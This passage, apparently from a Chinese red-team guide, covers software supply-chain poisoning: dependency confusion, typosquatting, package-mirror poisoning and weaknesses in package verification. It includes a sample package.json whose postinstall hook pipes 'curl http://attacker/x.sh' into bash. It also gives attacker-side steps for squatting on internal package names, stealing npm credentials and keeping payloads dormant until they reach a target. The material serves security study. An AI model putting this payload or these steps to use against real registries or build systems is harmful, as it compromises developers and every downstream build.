## 四、供应链投毒（依赖混淆与恶意包）

### 4.1 依赖混淆攻击（Dependency Confusion）
```
# 原理: 包管理器优先从公共源拉取"名称相同"的包；内部包名未在公共源注册时，
#       攻击者在公共源抢注同名包 → 内部构建自动拉取恶意版本
# 案例: 2021 Alex Birsan——抢注苹果/微软/特斯拉内部包名 → 数十家厂商内网RCE
# 手法:
# 1) 收集内部包名:
#    - 内部 npm registry 响应/错误信息
#    - 公开仓库中的 package.json / requirements.txt / pom.xml 引用
#    - GitHub dork: "registry.npmjs.org" + 公司名
# 2) 检查公共源同名包是否已存在（npm view <name>）
# 3) 抢注同名包，预埋恶意 install/postinstall 脚本
# 4) 等待内部 CI 构建拉取 → 自动执行
# payload 示例(package.json):
{
  "name": "internal-lib",
  "version": "99.99.99",
  "scripts": { "postinstall": "curl http://attacker/x.sh | bash" }
}
# PyPI 对应: setup.py 的 setup() 参数/egg_info 钩子；Maven: 同 groupId+artifactId
# 工具: Confused / DependencyCheck 反查验证
```

### 4.2 Typosquatting 与恶意包投递
```
# Typosquatting: 仿冒知名包名（1字符之差/连字符/复数/小写）
#   lodash → 1odash / react → reactt / babel-core → babel_core
# 手法: 大规模上架 → 等误装（开发/CI 装错即中招）
# 恶意行为: install 后门、凭据回传（读取 ~/.npmrc / env）、挖矿
# 高价值目标: 开发依赖/构建工具（webpack/vite/ts-node）→ 影响所有下游构建
# 检测: npm audit / OSV-scanner / pip-audit / Dependabot 告警面
# 红队侧: 投放后保持"无害外观"，只在特定环境(内网域名/时间)激活
```

### 4.3 依赖缓存/镜像污染
```
# npm registry 代理(verdaccio/nexus) → 替换内部源中已缓存包
# pip 私有 index 劫持 → 覆盖内部 wheel 包
# Maven 私服 → 篡改 .m2 缓存 / settings.xml 指向恶意镜像
# 镜像源替换: 开发者配置被改 → 所有拉包走攻击者源
# Docker 同理: 内网 registry 镜像被替换（见5.2）
```

### 4.4 包验证绕过
```
# 非锁定版本: package.json 用 ^/~/latest → 更新即被劫持
# 无 lock 文件: npm-shrinkwrap/package-lock 缺失 → 依赖解析可被注入
# 签名绕过: sigstore/cosign 未启用 → 镜像/包无签名可篡改
# supply-chain 自动化工具缺陷: 部分扫描器仅扫 lock 不扫传递依赖
```

